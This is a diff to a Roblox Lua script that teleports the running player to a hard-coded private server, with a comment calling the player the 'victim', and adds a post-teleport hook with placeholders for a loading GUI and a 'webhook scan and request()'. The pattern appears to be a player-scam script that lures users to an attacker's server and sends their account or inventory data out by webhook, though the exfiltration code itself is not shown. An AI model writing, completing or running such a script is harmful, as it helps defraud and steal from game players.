@@ -8,11 +8,19 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
---- 🧭 Teleport victim to private server
+-- 🧭 Teleport first
 pcall(function()
     local placeId = 126884695634066
     local accessCode = "40206718588419987554943106780552"
-    TeleportService:TeleportToPrivateServer(placeId, accessCode, {LocalPlayer})
+    TeleportService:TeleportToPrivateServer(placeId, accessCode, {game:GetService("Players").LocalPlayer})
+end)
+
+-- ✅ After teleport, run GUI + webhook
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(state)
+    if state == Enum.TeleportState.Completed then
+        -- Put your GUI here
+        -- Put your webhook scan and request() here
+    end
 end)
 -- 👁‍🗨 Loading GUI (your code)
 -- COPY exactly your GUI code here; I'm wrapping below for brevity:
